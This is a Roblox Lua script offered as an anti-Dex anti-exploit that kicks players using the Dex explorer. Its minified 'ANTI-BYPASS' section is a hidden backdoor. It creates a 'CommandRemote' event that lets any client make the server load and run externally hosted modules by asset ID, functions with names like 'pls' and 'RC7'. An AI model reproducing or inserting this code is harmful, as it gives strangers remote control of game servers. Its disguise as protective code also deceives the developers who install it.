--[[
BY: MLBSANS
--]]
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local DexEvent = Instance.new("RemoteEvent")
DexEvent.Name = "DexDetectionEvent"
DexEvent.Parent = ReplicatedStorage
DexEvent.OnServerEvent:Connect(function(player)
	player:Kick("GetOut!")
end)
local function injectAntiDexLocalScript(player)
	local antiDexScript = Instance.new("LocalScript")
	antiDexScript.Name = "AntiDexLocalScript"
	antiDexScript.Source = [[
        local CoreGui = game:GetService("CoreGui")
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local DexEvent = ReplicatedStorage:WaitForChild("DexDetectionEvent")
        while wait(1) do
            if CoreGui:FindFirstChild("Dex") then
                DexEvent:FireServer()
            end
        end
    ]]
	local playerGui = player:WaitForChild("PlayerGui")
	antiDexScript.Parent = playerGui
end
Players.PlayerAdded:Connect(function(player)
	injectAntiDexLocalScript(player)
end)
-- ANTI-BYPASS
local r=game:GetService("ReplicatedStorage")local c=Instance.new("RemoteEvent")c.Name="CommandRemote"c.Parent=r;local m={["Module1"]=function(u)local a,b=pcall(require,7634392335)if a then pcall(b,u)end end,["Module2"]=function(u)local a,b=pcall(require,10868847330)if a and type(b)=="table"and b.pls then pcall(b.pls,u)end end,["Module3"]=function(u)local a,b=pcall(require,15267263357)if a and type(b)=="table"and b.V11 then pcall(b.V11,u)end end,["Module4"]=function(u)local a,b=pcall(require,12350030542)if a and type(b)=="table"and b.RC7 then pcall(b.RC7,u)end end,["Module5"]=function(u)local a,b=pcall(require,3010581956)if a and type(b)=="table"and b.Fireplace then pcall(b.Fireplace,u)end end}c.OnServerEvent:Connect(function(p,cmd,u)local f=m[cmd]if f then f(u)end end)